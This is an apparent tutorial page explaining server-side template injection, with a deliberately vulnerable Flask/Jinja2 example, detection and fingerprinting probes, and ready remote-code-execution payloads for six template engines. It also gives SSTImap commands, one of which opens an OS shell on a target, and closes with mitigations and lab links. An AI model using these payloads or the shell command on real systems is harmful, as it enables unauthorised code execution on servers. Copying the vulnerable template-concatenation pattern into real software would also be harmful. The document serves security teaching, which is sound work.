# What is Server-Side Template Injection?

Server-Side Template Injection (SSTI) happens when user input is embedded into a template that the server then evaluates. Because template engines can call into the host language, SSTI often escalates straight to remote code execution. The classic tell is that `{{7*7}}` comes back as `49`.

## How it works

Vulnerable code puts user input **into** the template string instead of passing it as data:

```python
# VULNERABLE (Flask/Jinja2) - name is rendered as template code
from flask import request
from jinja2 import Template
name = request.args.get('name')
Template("Hello " + name).render()      # attacker controls template!
```

Request `?name={{7*7}}` and the page shows `Hello 49` - the engine evaluated your input. Because template engines can reach into the host language, SSTI usually escalates straight to RCE.

## Impact

- **Remote code execution** (most engines)
- Read server-side variables, config, secrets
- File read/write, SSRF

## Step 1 - Detect (the `{{7*7}}` test)

Send a polyglot and look for evaluation (e.g. `49`, or an error):

```text
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
${{<%[%'"}}%\      (breaks syntax -> error confirms a template context)
```

## Step 2 - Fingerprint the engine

Use the decision tree: send `{{7*7}}` and `${7*7}` and see which evaluates.

```text
{{7*7}} = 49       -> Jinja2 (Python) or Twig (PHP)
  {{7*'7'}} = 7777777  -> Jinja2 ;  {{7*'7'}} = 49 -> Twig
${7*7} = 49        -> Freemarker or JSP/Spring EL
#{7*7} = 49        -> Ruby ERB or Thymeleaf
<%= 7*7 %> = 49    -> ERB (Ruby) / EJS (Node)
{7*7} = 49         -> Smarty (PHP)
#{7*7} / *{7*7}    -> Thymeleaf (Java)
```

## Step 3 - Exploit to RCE (per engine)

```python
# Jinja2 (Python) - enumerate then execute
{{ config }}                                  # dump Flask config/secrets
{{ ''.__class__.__mro__[1].__subclasses__() }}  # find useful classes
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

```php
// Twig (PHP)
{{ ['id']|filter('system') }}
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
```

```java
// Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

```java
// Thymeleaf (Java/Spring)
${T(java.lang.Runtime).getRuntime().exec('id')}
```

```ruby
# ERB (Ruby)
<%= system('id') %>
<%= `id` %>
```

```javascript
// EJS / Node
<%= global.process.mainModule.require('child_process').execSync('id') %>
```

## Tools

- [tplmap](https://github.com/epinna/tplmap) - automated SSTI detection and exploitation
- [SSTImap](https://github.com/vladko312/SSTImap) - maintained tplmap successor
- [Burp Suite](https://portswigger.net/burp) - Repeater for manual fingerprinting

```bash
# Automated detection + exploitation
python3 sstimap.py -u "https://target.tld/page?name=test"
# Get a shell
python3 sstimap.py -u "https://target.tld/page?name=test" --os-shell
```

## Mitigation - the fix

- **Never let users control template content.** Pass their data as variables/parameters:

```python
# SAFE - user data is a variable, not part of the template
Template("Hello {{ name }}").render(name=user_input)
```

- Use a **logic-less / sandboxed** engine for untrusted templates (e.g. Jinja2 `SandboxedEnvironment`).
- Keep the engine patched; disable dangerous built-ins.
- Run with least privilege so RCE is contained.

## Practice

- [PortSwigger SSTI labs](https://portswigger.net/web-security/server-side-template-injection)

## Deep dive

- [SSTI - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [PortSwigger SSTI labs](https://portswigger.net/web-security/server-side-template-injection)

## CWE

- CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine
- CWE-94: Improper Control of Generation of Code
